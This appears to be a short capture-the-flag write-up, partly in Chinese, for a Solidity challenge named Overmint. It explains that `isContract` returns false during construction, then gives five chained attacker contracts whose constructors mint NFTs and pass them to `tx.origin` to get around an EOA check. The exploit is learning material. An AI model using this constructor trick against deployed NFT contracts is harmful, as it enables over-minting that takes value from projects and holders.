```solidity
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

```

这道题有两个点需要注意一下，比较重要的就是合约在创建的时候，代码是不在链上的，所以isContract返回值是false，即不能用isContract来确定msg.sender是EOA还是contract

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "./Overmint2.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint3Attacker {
    constructor(address addr) {
        Overmint2(addr).mint();

        Overmint2(addr).transferFrom(address(this), tx.origin, 1);

        new A(addr);
    }
}

contract A {
    constructor(address addr) {
        Overmint2(addr).mint();

        Overmint2(addr).transferFrom(address(this), tx.origin, 2);
        new B(addr);
    }
}

contract B {
    constructor(address addr) {
        Overmint2(addr).mint();

        Overmint2(addr).transferFrom(address(this), tx.origin, 3);
        new C(addr);
    }
}

contract C {
    constructor(address addr) {
        Overmint2(addr).mint();

        Overmint2(addr).transferFrom(address(this), tx.origin, 4);
        new D(addr);
    }
}

contract D {
    constructor(address addr) {
        Overmint2(addr).mint();

        Overmint2(addr).transferFrom(address(this), tx.origin, 5);
    }
}

```

所以在5个合约的constructor中去进行hack



